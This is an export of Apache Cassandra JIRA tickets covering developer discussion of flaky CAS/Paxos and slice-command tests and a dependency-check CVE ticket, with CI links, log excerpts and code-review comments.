[junit-timeout] 		at org.apache.cassandra.service.StorageProxy$HintRunnable.run(StorageProxy.java:2585)
[junit-timeout] 		at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81)
[junit-timeout] 		at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)
[junit-timeout] 		at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)
[junit-timeout] 		at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:120)
[junit-timeout] 		at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
[junit-timeout] 		at java.lang.Thread.run(Thread.java:748)
[junit-timeout] 	Caused by: java.lang.IllegalStateException: HintsService is shut down and can't accept new hints
[junit-timeout] 		at org.apache.cassandra.hints.HintsService.write(HintsService.java:165)
[junit-timeout] 		at org.apache.cassandra.service.StorageProxy$7.runMayThrow(StorageProxy.java:2664)
[junit-timeout] 		at org.apache.cassandra.service.StorageProxy$HintRunnable.run(StorageProxy.java:2581)
[junit-timeout] 
[junit-timeout] 
{noformat};;;","29/Jul/22 12:57;benedict;-Hmm, is there an issue with gossip? Have the defaults for gossip been changed in in-jvm dtests? There shouldn't be gossip running, but there seem to be background changes in gossip state for the nodes (that span messages being sent).-
{noformat}
[junit-timeout] INFO  [MutationStage-1] <main> 2022-07-29 12:19:44,849 CASTestBase.java:124 - Dropping PAXOS2_PREPARE_REQ from 1 to 3
[junit-timeout] INFO  [node1_GossipStage:1] node1 2022-07-29 12:19:44,896 Gossiper.java:1409 - Node /127.0.0.4:7012 is now part of the cluster
[junit-timeout] DEBUG [node1_GossipStage:1] node1 2022-07-29 12:19:44,897 StorageService.java:2887 - Node /127.0.0.4:7012 state NORMAL, token [9223372036854775801]
[junit-timeout] DEBUG [node1_GossipStage:1] node1 2022-07-29 12:19:44,901 StorageService.java:2797 - New node /127.0.0.4:7012 at token 9223372036854775801
[junit-timeout] DEBUG [node1_GossipStage:1] node1 2022-07-29 12:19:44,914 Gossiper.java:1353 - removing expire time for endpoint : /127.0.0.4:7012
[junit-timeout] INFO  [node1_GossipStage:1] node1 2022-07-29 12:19:44,914 Gossiper.java:1354 - InetAddress /127.0.0.4:7012 is now UP
[junit-timeout] INFO  [MutationStage-1] <main> 2022-07-29 12:19:44,915 CASTestBase.java:124 - Dropping PAXOS2_PREPARE_REQ from 1 to 3
[junit-timeout] INFO  [ReadStage-1] <main> 2022-07-29 12:19:45,536 CASTestBase.java:124 - Dropping READ_REQ from 1 to 3 {noformat}
Of course, this is _probably_ the application of the new ring state obtained via PaxosPrepare.;;;","29/Jul/22 13:25;adelapena;[Here|https://app.circleci.com/pipelines/github/adelapena/cassandra/1969/workflows/4b9858d8-900c-4aa3-818b-2d430234f9e9/jobs/19592] is a new repeated run for [the commit|https://github.com/ekaterinadimitrova2/cassandra/commit/d2923275e360a1ee9db498e748c269f701bb3a8b] when the test was introduced, or not ignored anymore, by CASSANDRA-17164.

I'm repeating this run because [the artifacts|https://app.circleci.com/pipelines/github/adelapena/cassandra/1969/workflows/4b9858d8-900c-4aa3-818b-2d430234f9e9/jobs/19592/artifacts] (logs, etc.) are retained for one month, so we have missed the artifacts of [Ekaterina's run on 8th Jun|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1707/workflows/d6950287-f00e-428b-976e-1f19dfac0345/jobs/11936/tests]. This run hits {{CasWriteTimeoutException}} four times, and there are no issues with shutdown.;;;","01/Aug/22 14:15;benedict;Would it be possible to run this with {{TRACE}} logging enabled for {{org.apache.cassandra.service.paxos}}?;;;","08/Aug/22 16:47;jmckenzie;[~leesangboo] I see that you transitioned this ticket to In Progress - are you working on this? Can set you as assignee if so.;;;","10/Aug/22 22:55;e.dimitrova;{quote}Would it be possible to run this with {{TRACE}} logging enabled for {{{}org.apache.cassandra.service.paxos{}}}? 
{quote}
Everything is possible as long as there is someone with a bit of time :D 

[This|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17461-repro] is a run with TRACE logging enabled for org.apache.cassandra.service.paxos. I ran it for the commit when the test was introduced, or not ignored anymore, by CASSANDRA-17164. All logs are under the artifacts tab. ;;;","11/Aug/22 14:06;benedict;Thanks Ekaterina, that makes clear what the problem is. The issue is that when node1 receives an update to its ring information about node4, it first contacts node4 to confirm it is alive before marking it so, and this is racing with the submission of the second round of Paxos Prepares so that the outgoing message to node4 is being dropped before it hits the wire.

I have introduced some additional logic to ensure that node4 is marked alive before the second round of prepares is submitted

https://github.com/belliottsmith/cassandra/tree/17461-4.1;;;","12/Aug/22 10:12;adelapena;[~benedict] do you have a CI run for the patch? I have just started some repeated runs for [j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1989/workflows/a6c7d6fa-08d0-41be-8ec0-049ab71c9dd7] and [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1989/workflows/994d3066-f24c-460e-b251-8491d24a9890] with the aforementioned CircleCI config file:
{code:java}
.circleci/generate.sh -m \
  -e REPEATED_UTEST_TARGET=test-jvm-dtest-some \
  -e REPEATED_UTEST_COUNT=500 \
  -e REPEATED_UTEST_CLASS=org.apache.cassandra.distributed.test.CASTest \
  -e REPEATED_UTEST_METHODS=testConflictingWritesWithStaleRingInformation
{code};;;","12/Aug/22 11:14;adelapena;It seems that the patched test is still failing with both the {{CasWriteTimeoutException}} and the {{{}ShutdownException{}}}.;;;","12/Aug/22 18:04;benedict;The {{ShutdownException}} is a problem with node shutdown, so I don't think it is relevant to this ticket. I have not attempted to address these issues (I actually see at least two distinct shutdown problems)

These seem to account for most of the failures now, so perhaps there is some progress?

Unfortunately I have no idea how to run your repeated tests in CircleCI, and cannot reproduce locally, so have been guided so far entirely by log output. Perhaps you can explain to me how to use your tool, so I can run again with TRACE output to see what might be happening in this timeout case, if it is indeed different?
;;;","12/Aug/22 22:13;e.dimitrova;{quote}Unfortunately I have no idea how to run your repeated tests in CircleCI, and cannot reproduce locally, so have been guided so far entirely by log output. Perhaps you can explain to me how to use your tool, so I can run again with TRACE output to see what might be happening in this timeout case, if it is indeed different?
{quote}
In order to run the test in a loop, the job we pushed, you need to cherry-pick [this commit|https://github.com/adelapena/cassandra/commit/b026210655e8759e5f47d8eb072c0ae954ee3f52] which was created by running this command:
{code:java}
.circleci/generate.sh -m \
-e REPEATED_UTEST_TARGET=test-jvm-dtest-some \
-e REPEATED_UTEST_COUNT=500 \
-e REPEATED_UTEST_CLASS=org.apache.cassandra.distributed.test.CASTest \
-e REPEATED_UTEST_METHODS=testConflictingWritesWithStaleRingInformation{code}
Then when you push your branch and generate the workflows in CircleCI (as every other patch), you go to either
 
_java_11_separate_tests_ or _java8_separate_tests_ workflow - depends on which JDK you want to use at this point, and press first either _start_j8_build_ or respectively _start_j11_build_
Then you press and approve the following job - _start_j11_repeated_utest_ or again respectively _start_j8_repeated_utest_
 
This will run the test 500 times
 
Also, I would like to mention there is a [readme|https://github.com/adelapena/cassandra/blob/trunk/.circleci/readme.md] in the CircleCI in-tree folder, also more info and examples how to run tests from the different suites in a loop  can be found in [config-2_1.yml|https://github.com/adelapena/cassandra/blob/trunk/.circleci/config-2_1.yml#L47-L99]
 
These jobs are really useful and saved us a lot of time with flaky tests. I would strongly recommend anyone to spend 15 minutes to read through things as I am sure those are really super useful. Please let me know if you have any questions or concerns. I will be happy to help
 ;;;","12/Aug/22 22:26;brandon.williams;For TRACE, you'll need to add something like [this commit|https://github.com/ekaterinadimitrova2/cassandra/commit/2a09ac31d2219d427a23e5baa6e6708c954eb875].;;;","15/Aug/22 15:38;adelapena;I have been able to reproduce the CAS timeout locally too, by just running the test in a shell loop:
{code:java}
for i in {1..500}
do
  ant test-jvm-dtest-some -Dtest.name=""org.apache.cassandra.distributed.test.CASTest"" -Dtest.methods=""testConflictingWritesWithStaleRingInformation"" 
done
{code}
It can take a while to hit a failure, though. The CircleCI job does basically the same but using multiple parallel runners.
 ;;;","16/Aug/22 07:16;bereng;^I wasn't able to repro locally with the {{RepeatableRunner}} #justfyi;;;","17/Aug/22 18:04;benedict;Ok, I was on the right track but I had intercepted the problem at the wrong point. I have pushed a new commit to the same branch, and the latest test run is only failing due to the hints service shutdown problem.

(Which isn't really a problem, and might be something we can just choose to ignore, though probably shutdown should avoid a sequence of events that permits a hint to be submitted to a shutdown hint service, I think that's out of the scope of this ticket);;;","18/Aug/22 12:02;adelapena;Indeed that seems to fix the CAS timeouts in {{{}testConflictingWritesWithStaleRingInformation{}}}, leaving only the shutdown errors (CI for [j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1998/workflows/16da8bc2-ef5a-4ceb-b4fa-6fba61f30bed] and [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1998/workflows/c515b1e9-484f-4d4e-b2fa-a13721c16718]).

If we repeatedly run the entire {{CASTest}} class, other tests still hit CAS timeouts (CI for [j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1999/workflows/491c56ef-a6f9-44a5-803f-2ad475279147] and [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1999/workflows/577321bb-26f9-42ec-ba3a-6dca1f111968]). However, in this case the shutdown errors don't seem to reproduce anymore.

The CircleCI config file for running the entire test class has been generated with:
{code:java}
.circleci/generate.sh -m \
  -e REPEATED_UTEST_TARGET=test-jvm-dtest-some \
  -e REPEATED_UTEST_COUNT=500 \
  -e REPEATED_UTEST_CLASS=org.apache.cassandra.distributed.test.CASTest
{code}
 ;;;","18/Aug/22 15:25;brandon.williams;I took a shot a simplifying the logic in waiting for node4 to be marked up [here|https://github.com/driftx/cassandra/commit/038e1c0e8e4fab1ef2d3c03c0c8907da08c42f1b] which also is left with the [shutdown errors|https://app.circleci.com/pipelines/github/driftx/cassandra/590/workflows/041b21e3-530c-4a8b-9194-b55bdf37f83e/jobs/6922].;;;","18/Aug/22 15:40;benedict;Unfortunately that's no longer testing anything...

We sort of need the ownership discrepancy to be discovered by the Paxos operation, not to be applied before it starts.;;;","18/Aug/22 15:52;brandon.williams;I think the problem is the paxos operation doesn't cause discovery, if we just wait for node4 without adding it ourselves, it will never come up.  Marking it up yourself during the paxos operation won't actually happen in practice, I don't think.

I'm not sure what the correct solution is but I think there's a better way to accomplish it than a custom FD and inspecting the stack.;;;","18/Aug/22 15:54;benedict;It _does_ cause discovery, but we have a weird behaviour (that is almost certainly wrong in most cases) where we mark a node as _down_ after any major state change and then ping it via echo before marking it as alive. We are racing with that latter part.

You can clearly see in the TRACE logs that the Paxos operation detects the divergent ring, propagates this to {{Gossiper}}, and correctly waits for pending ranges to be recomputed and gossip state applied. Unfortunately, we don't have an easy way to make it also wait for {{realMarkAlive}}. We could modify the actual behaviour of major state changes, but while I think that might be more correct, I don't want to touch it just for this test and don't have the time for the proper duty of care needed for such changes.;;;","19/Aug/22 15:01;brandon.williams;bq. We sort of need the ownership discrepancy to be discovered by the Paxos operation

Can you help me understand why this is the case?  At this point in time, in node1's view, node4 has been decommissioned/assassinated and is in the LEFT state, but node4's actual state is unchanged from NORMAL so any gossip exchange between node1 and node4 will cause the state change back to the correct state of NORMAL.  This doesn't have to be from a Paxos operation though (and in the real world, may not get so lucky in timing to be from one) and it looks like the other 'stale ring' tests are explicitly adding node4 back, only this one does not.;;;","19/Aug/22 15:45;benedict;bq. in node1's view, node4 has been decommissioned/assassinated and is in the LEFT state

No, node1's view has node4 as never having joined the ring, as we invoke {{unsafeAnnulEndpoint}} after updating the token information via the LEFT state. This is just a convenient way to simulate node4 joining without node1 receiving the gossip state.

bq. any gossip exchange between node1 and node4 will cause the state change back to the correct state of NORMAL ... and in the real world, may not get so lucky in timing to be from one

You have it backwards. Ordinary operations _depend_ on gossip disseminating this promptly for correctness. We are simulating this having not happened yet, leading to an inconsistent view of the token ring and permitting operations to reach consensus without overlapping quorums, due to token ownership disagreements. Paxos operations (which must be linearizable) are now able to detect this inconsistency themselves and enforce it, by updating the gossip state directly.

Note that the {{Timeout}} is also a _valid outcome_ for this test, just a bad one for validating everything else is working correctly. The reason the {{Timeout}} occurs is that we explicitly drop messages to one of the _correct_ owners to ensure we can only succeed by contacting the _new_ owner, and if this race occurs we drop this message too, leaving only one correct owner that can respond.

bq. it looks like the other 'stale ring' tests are explicitly adding node4 back, only this one does not.

Yes, they are testing other things.

;;;","20/Aug/22 10:30;benedict;bq. other tests still hit CAS timeouts

Some of these at least are probably similar situations to this test. I will try to take a look at these, but probably not until the end of the coming week or so.;;;","25/Aug/22 15:18;brandon.williams;In the remaining timeout failures I noticed that these appeared to also be racing with node4 being marked up, so I created a [branch|https://github.com/driftx/cassandra/tree/CASSANDRA-17461-4.1] that waits for it after it has been added back to the ring, but now the same tests [fail|https://app.circleci.com/pipelines/github/driftx/cassandra/605/workflows/006a6d26-0a2d-4c5b-9ed2-ac04c99227b0/jobs/6990] in a different way that I haven't figured out yet, but there's TRACE logging included on that test run.;;;","25/Aug/22 15:39;benedict;Thanks. I ran a CASTest loop and found the following tests to fail sometimes:

[testSucccessfulWriteDuringRangeMovementFollowedByRead|https://app.circleci.com/pipelines/github/belliottsmith/cassandra/316/workflows/4f40397c-5caf-4eeb-8e7d-608b30796f77/jobs/7110]
[testSuccessfulWriteDuringRangeMovementFollowedByConflicting|https://app.circleci.com/pipelines/github/belliottsmith/cassandra/317/workflows/27c83972-4006-46be-9c78-91adae6b93c8/jobs/7111]
[testSuccessfulWriteBeforeRangeMovement|https://app.circleci.com/pipelines/github/belliottsmith/cassandra/318/workflows/de219103-e7a2-4767-b28b-b774167afbae/jobs/7109]
[testIncompleteWriteFollowedBySuccessfulWriteWithStaleRingDuringRangeMovementFollowedByRead|https://app.circleci.com/pipelines/github/belliottsmith/cassandra/319/workflows/9ee97d36-d2f8-4d90-a64f-0f873344239a/jobs/7108]

I have run them in a loop with TRACE logging, though they mostly _didn't_ fail when being run on their own, even with 500 iterations. Only {{testSuccessfulWriteBeforeRangeMovement}} reliably fails, and testSuccessfulWriteDuringRangeMovementFollowedByConflicting failed once. The other two did not fail at all, ignoring the CASTest-level shutdown failures. 

I will find the time at some point to dig further into all of these outputs.;;;","19/Sep/22 19:34;bdeggleston;Since the race isn't really a bug, just something that can happen in this situation, I've reworked the affected tests to tolerate the race. Instead of requiring the query to succeed, it will retry a few times on timeouts, but also assert the expected ring state before and after the query. The ring change tests no longer fail in circle, even after 600 runs.

https://github.com/bdeggleston/cassandra/tree/C17461;;;","19/Sep/22 20:22;benedict;I feel like this weakens the tests, but I think it _should_ still catch a regression _in principle_. Have we confirmed these new versions fail with v1, as they should?;;;","19/Sep/22 21:17;bdeggleston;{quote}I feel like this weakens the tests{quote}

How so? We're interested in whether the paxos operation updates the ring, and doesn't complete operations with stale topology, which this still tests. The tests all fail with v1, as expected. ;;;","20/Sep/22 09:40;benedict;Well, since it should fix it for the first operation it leaves some room for some consistent breakage to occur that reliably breaks the first operation (rather than infrequently).

BUT, quite evidently we don't have the time to agonise over these tests and the alternative is probably annotating them to be ignored, and it's only a slight weakening. So +1, let's ship 4.1;;;","26/Sep/22 14:06;brandon.williams;This is the only ticket blocking the release of 4.1, is there anything left to be done here?;;;",,,,,,,,,,,,,,,,,,,,,,,,,
"OWASP failures, 3/2022",CASSANDRA-17459,13434889,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,21/Mar/22 11:52,27/May/22 19:25,13/Jul/23 08:40,22/Mar/22 12:44,4.0.4,4.1,4.1-alpha1,,,,Build,,,,0,,"On trunk there are a few failures:

{quote}
Dependency-Check Failure:
One or more dependencies were identified with vulnerabilities that have a CVSS score greater than or equal to '1.0': 
cassandra-driver-core-3.11.0-shaded.jar: CVE-2021-44521
jackson-databind-2.12.5.jar: CVE-2020-36518
See the dependency-check report for more details.
{quote}

Notably, we have bitten ourselves with CVE-2021-44521, which the driver has echoed, which we depend on.",,bereng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Security,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Mar 22 12:44:28 UTC 2022,,,,,,,All,,,,"0|z10o4w:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/592cee30640f7d5ca0fc80cefb1c9dad24a58a81,,,,,,,,,run CI,,,,,"21/Mar/22 12:18;brandon.williams;jackson-databind: For CVE-2020-36518 we should upgrade as someone could technically cause a DoS with json over cql

cassandra-driver: For the driver we'll just suppress our own CVE-2021-44521.
;;;","21/Mar/22 19:10;brandon.williams;||Branch||CI||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17459-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/401/workflows/c41bec40-31ff-4d7f-b55e-81018588f1f3] , [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/401/workflows/1d911d34-0e62-402d-bfd5-3a47fccecfb4]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17459-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/402/workflows/1605b312-8058-4f87-b08d-66c801656b98] , [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/402/workflows/31e07c88-dc14-49d9-972a-0ca0f2551fe5]|

Adds the suppression.
;;;","22/Mar/22 07:58;bereng;LGTM +1;;;","22/Mar/22 12:44;brandon.williams;Committed, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: org.apache.cassandra.db.SinglePartitionSliceCommandTest.testPartitionDeletionRangeDeletionTie,CASSANDRA-17458,13434882,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,sathyakplm,adelapena,adelapena,21/Mar/22 11:09,05/Oct/22 22:30,13/Jul/23 08:40,07/Jun/22 12:10,4.1,4.1-alpha1,5.0,,,,Test/unit,,,,0,patch-available,"Intermittent failure on {{org.apache.cassandra.db.SinglePartitionSliceCommandTest#testPartitionDeletionRangeDeletionTie}} for trunk:

[https://ci-cassandra.apache.org/job/Cassandra-trunk/1024/testReport/org.apache.cassandra.db/SinglePartitionSliceCommandTest/testPartitionDeletionRangeDeletionTie/]

[https://ci-cassandra.apache.org/job/Cassandra-trunk/1018/testReport/org.apache.cassandra.db/SinglePartitionSliceCommandTest/testPartitionDeletionRangeDeletionTie/]
{code:java}
Failed 1 times in the last 11 runs. Flakiness: 10%, Stability: 90%
Error Message
Expected [Row[info=[ts=11] ]: c1=1, c2=1 | [v=1 ts=11]] but got [Marker INCL_START_BOUND(1, 1)@10/1647704834, Row[info=[ts=11] ]: c1=1, c2=1 | [v=1 ts=11], Marker INCL_END_BOUND(1, 1)@10/1647704834] expected:<[[[v=1 ts=11]]]> but was:<[org.apache.cassandra.db.rows.RangeTombstoneBoundMarker@3db1ed73, [[v=1 ts=11]], org.apache.cassandra.db.rows.RangeTombstoneBoundMarker@1ea92553]>
Stacktrace
junit.framework.AssertionFailedError: Expected [Row[info=[ts=11] ]: c1=1, c2=1 | [v=1 ts=11]] but got [Marker INCL_START_BOUND(1, 1)@10/1647704834, Row[info=[ts=11] ]: c1=1, c2=1 | [v=1 ts=11], Marker INCL_END_BOUND(1, 1)@10/1647704834] expected:<[[[v=1 ts=11]]]> but was:<[org.apache.cassandra.db.rows.RangeTombstoneBoundMarker@3db1ed73, [[v=1 ts=11]], org.apache.cassandra.db.rows.RangeTombstoneBoundMarker@1ea92553]>
	at org.apache.cassandra.db.SinglePartitionSliceCommandTest.testPartitionDeletionRangeDeletionTie(SinglePartitionSliceCommandTest.java:463)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
Standard Output
INFO  [main] 2022-03-19 15:51:43,646 YamlConfigurationLoader.java:103 - Configuration location: file:/home/cassandra/cassandra/test/conf/cassandra.yaml
DEBUG [main] 2022-03-19 15:51:43,653 YamlConfigurationLoader.java:124 - Loading settings from file:/home/cassandra/cassandra/test/conf/cassandra.yaml
INFO  [main] 2022-03-19 15:51:43,971 Config.java:1119 - Node configuration:[allocate_tokens_for_keyspace=null; allocate_tokens_for_local_replication_factor=null; allow_extra_insecure_udfs=false; all
...[truncated 192995 chars]...
ome/cassandra/cassandra/build/test/cassandra/data/system/local-7ad54392bcdd35a684174e047860b377/nb-37-big-Data.db:level=0, /home/cassandra/cassandra/build/test/cassandra/data/system/local-7ad54392bcdd35a684174e047860b377/nb-39-big-Data.db:level=0, /home/cassandra/cassandra/build/test/cassandra/data/system/local-7ad54392bcdd35a684174e047860b377/nb-38-big-Data.db:level=0, /home/cassandra/cassandra/build/test/cassandra/data/system/local-7ad54392bcdd35a684174e047860b377/nb-40-big-Data.db:level=0, ]
{code}
Failures can also be hit with CircleCI test multiplexer:
[https://app.circleci.com/pipelines/github/adelapena/cassandra/1387/workflows/0f37a726-1dc2-4584-86f9-e99ecc40f551]

CircleCI results show failures on three separate assertions, with a ~3% flakiness.

The same test looks ok in 4.0, as suggested by Butler and [this repeated Circle run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1388/workflows/6b69d654-3d19-4f2a-aeb9-dc405c6ddd2b].",,adelapena,blerer,e.dimitrova,sathyakplm,,,,,,,,,,,"sathyakplm opened a new pull request #1528:
URL: https://github.com/apache/cassandra/pull/1528


   #### The Problem
   There are two delete statements in this test case.
   
   ##### First delete statement
   ```
   QueryProcessor.executeOnceInternalWithNowAndTimestamp(nowInSec,
       timestamp,
       ""DELETE FROM ks.partition_range_deletion USING TIMESTAMP 10 WHERE k=1"");
   ```
   
   ##### Second delete statement
   ```
   QueryProcessor.executeOnceInternalWithNowAndTimestamp(nowInSec,
       timestamp,
       ""DELETE FROM ks.partition_range_deletion USING TIMESTAMP 10 WHERE k=1 and c1=1"");
   ```
   
   The test case fails when the first statement and second statement falls in different `second` boundaries. We are passing `nowInSec`; but, this is not being respected while the entry is inserted. `FBUtilities.nowInSeconds()` is getting called instead.
   
   #### Solution
   Use `makeInternalOptionsWithNowInSec` instead of `makeInternalOptions`. This change makes sure that it respects the variable `nowInSec`.


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;27/Mar/22 06:42;githubbot;600","blerer commented on a change in pull request #1528:
URL: https://github.com/apache/cassandra/pull/1528#discussion_r836360872



##########
File path: src/java/org/apache/cassandra/cql3/QueryProcessor.java
##########
@@ -575,7 +575,7 @@ private static UntypedResultSet executeOnceInternal(QueryState queryState, Strin
     {
         CQLStatement statement = parseStatement(query, queryState.getClientState());
         statement.validate(queryState.getClientState());
-        ResultMessage result = statement.executeLocally(queryState, makeInternalOptions(statement, values));
+        ResultMessage result = statement.executeLocally(queryState, makeInternalOptionsWithNowInSec(statement, queryState.getNowInSeconds(), values));

Review comment:
       I am a bit confused with the change. I feel that the change should be at the test level not at the QueryProcessor level.
   Could you elaborate on why you believe that we should modify the code here?




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;28/Mar/22 12:13;githubbot;600","sathyakplm commented on a change in pull request #1528:
URL: https://github.com/apache/cassandra/pull/1528#discussion_r836426248



##########
File path: src/java/org/apache/cassandra/cql3/QueryProcessor.java
##########
@@ -575,7 +575,7 @@ private static UntypedResultSet executeOnceInternal(QueryState queryState, Strin
     {
         CQLStatement statement = parseStatement(query, queryState.getClientState());
         statement.validate(queryState.getClientState());
-        ResultMessage result = statement.executeLocally(queryState, makeInternalOptions(statement, values));
+        ResultMessage result = statement.executeLocally(queryState, makeInternalOptionsWithNowInSec(statement, queryState.getNowInSeconds(), values));

Review comment:
       Let's look at this particular call hierarchy when `executeOnceInternalWithNowAndTimestamp` is called.
   
   ```
   1 -> QueryProcessor :: public static UntypedResultSet executeOnceInternalWithNowAndTimestamp(int nowInSec, long timestamp, String query, Object... values)
   2 --> QueryProcessor :: private static UntypedResultSet executeOnceInternal(QueryState queryState, String query, Object... values)
   3 ---> QueryProcessor :: public static QueryOptions makeInternalOptions(CQLStatement prepared, Object[] values)
   4 ----> QueryProcessor :: private static QueryOptions makeInternalOptions(CQLStatement prepared, Object[] values, ConsistencyLevel cl)
   5 -----> QueryProcessor :: private static QueryOptions makeInternalOptionsWithNowInSec(CQLStatement prepared, int nowInSec, Object[] values, ConsistencyLevel cl)
   ```
   
   Look at how the call goes from step 4 to 5 in the above call hierarchy. The actual code how step 4 calls step 5 is below:
   ```
   return makeInternalOptionsWithNowInSec(prepared, FBUtilities.nowInSeconds(), values, cl);
   ```
   
   At this point, the `nowInSec` passed to `executeOnceInternalWithNowAndTimestamp` is not used; instead `FBUtilities.nowInSeconds()` is being used in the `SpecificOptions`.
   
   Now, let's see how this `SpecificOptions` is being used while writing the data. Let's look at the following hierarchy:
   
   ```
   1 -> QueryProcessor :: public static UntypedResultSet executeOnceInternalWithNowAndTimestamp(int nowInSec, long timestamp, String query, Object... values)
   2 --> QueryProcessor :: private static UntypedResultSet executeOnceInternal(QueryState queryState, String query, Object... values)
   3 ---> ModificationStatement :: public ResultMessage executeLocally(QueryState queryState, QueryOptions options) throws RequestValidationException, RequestExecutionException
   4 ----> ModificationStatement :: public ResultMessage executeInternalWithCondition(QueryState state, QueryOptions options)
   5 -----> QueryOptions :: public int getNowInSeconds(QueryState state)
   ```
   In the last step (5), we can see that the now in seconds is fetched using specific options: `int nowInSeconds = getSpecificOptions().nowInSeconds;`
   
   The `nowInSec` obtained from the specific options is being used to apply the mutation:
   ```
   for (IMutation mutation : getMutations(queryState.getClientState(), options, true, timestamp, nowInSeconds, queryStartNanoTime))
               mutation.apply();
   ```
   
   Summary:  `nowInSec` that is being used to apply the mutation is not the one we pass in `executeOnceInternalWithNowAndTimestamp`; but, the one which gets generated in`ModificationStatement :: public ResultMessage executeInternalWithCondition(QueryState state, QueryOptions `.
   
   Now, let's look at when the test case fails.
   
   The `nowInSec` generated in `QueryProcessor.java:384` is being used to write the data. It doesn't matter what we pass to `executeOnceInternalWithNowAndTimestamp`. Let me paste few lines from the test case to illustrate the problem.
   
   ```
               final long timestamp = FBUtilities.timestampMicros();
               final int nowInSec = FBUtilities.nowInSeconds();
   
               QueryProcessor.executeOnceInternalWithNowAndTimestamp(nowInSec,
                                                                     timestamp,
                                                                     ""DELETE FROM ks.partition_range_deletion USING TIMESTAMP 10 WHERE k=1"");
               if (flush && multiSSTable)
                   cfs.forceBlockingFlush();
               QueryProcessor.executeOnceInternalWithNowAndTimestamp(nowInSec,
                                                                     timestamp,
                                                                     ""DELETE FROM ks.partition_range_deletion USING TIMESTAMP 10 WHERE k=1 and c1=1"");
   
   ``` 
   There are two delete statements. The `nowInSec` that we pass along with the statements does not matter. Everything works fine as long as the first and second statement are in same same second `S`. The test fails when the first statement is in `S` and the second statement execute in `S+1`.
   
   Below are my assumptions why this breaks when these two delete statements are in two different second intervals. Please correct me if I am wrong.
   
   If `TIMESTAMP == 10` and `timeInSec == S` for both the statements, both the delete statements are accounted under `TIMESTAMP 10`.
   
   If `TIMESTAMP == 10` and `timeInSec == S` for first statement and `TIMESTAMP == 10` and `timeInSec == S+1` for second statement, the first statement is accounted for `TIMESTAMP 10` and the second statement is accounted for a `TIMESTAMP > 10`.
   
   @blerer , let me know if this explains. If there are other ways to solve this issue, I would be happy to learn.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;28/Mar/22 13:24;githubbot;600","blerer commented on a change in pull request #1528:
URL: https://github.com/apache/cassandra/pull/1528#discussion_r836556133



##########
File path: src/java/org/apache/cassandra/cql3/QueryProcessor.java
##########
@@ -575,7 +575,7 @@ private static UntypedResultSet executeOnceInternal(QueryState queryState, Strin
     {
         CQLStatement statement = parseStatement(query, queryState.getClientState());
         statement.validate(queryState.getClientState());
-        ResultMessage result = statement.executeLocally(queryState, makeInternalOptions(statement, values));
+        ResultMessage result = statement.executeLocally(queryState, makeInternalOptionsWithNowInSec(statement, queryState.getNowInSeconds(), values));

Review comment:
       Thanks for the explanation. I was confused because the logic was not the one that I remembered. Apparently, it has been changed recently. Let me dig in. :-)




-- 
This is an automated message from the Apache Git Service.
